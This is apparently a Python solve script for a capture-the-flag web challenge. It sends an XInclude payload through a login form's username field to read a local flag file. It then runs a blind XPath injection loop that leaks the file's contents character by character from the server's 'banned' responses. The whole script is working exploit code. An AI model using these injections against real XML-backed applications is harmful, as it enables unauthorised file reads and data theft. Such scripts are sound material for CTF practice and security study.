import requests
import random
import string

URL = "http://18.159.101.163/chall2/"
flag = ''
bannedUsername = ''


def randomUserName(length = 5):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k = length))


# add XInclude payload to the file /tmp/sys/<$_SERVER['REMOTE_ADDR']>
def XInclude():
    s = requests.Session()
    XIncludePayload = """<to xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///flag2.txt"/></to>"""
    s.get(URL , params = {'page': 'login', 'username': XIncludePayload, 'password': 'to^'})
    s.get(URL , params = {'page': 'login', 'username': XIncludePayload, 'password': 'to^'})
    s.get(URL , params = {'page': 'login', 'username': XIncludePayload, 'password': 'to^'})
    s.get(URL , params = {'page': 'login', 'username': XIncludePayload, 'password': 'to^'})


def createBannedUser(username):
    s = requests.Session()
    s.get(URL , params = {'page': 'login', 'username': username, 'password': 'to^'})
    s.get(URL , params = {'page': 'login', 'username': username, 'password': 'to^'})
    s.get(URL , params = {'page': 'login', 'username': username, 'password': 'to^'})
    s.get(URL , params = {'page': 'login', 'username': username, 'password': 'to^'})



def find_flag(username):
    global flag
    i = 1
    while not flag.endswith('}'):
        for c in string.printable:
            payload = f"{username}' and substring(//to,{i},1) = '{c}' or 'a' = 'b"
            r = requests.get(URL, params = {'page': 'login', 'username': payload, 'password': 'to^'})
            # print(f'{payload} - {r.text}')
            if "banned" in r.text:
                flag += c
                print(flag)
                i+=1
                break

if __name__ == '__main__':
    bannedUsername = randomUserName()
    createBannedUser(bannedUsername)
    XInclude()
    find_flag(bannedUsername)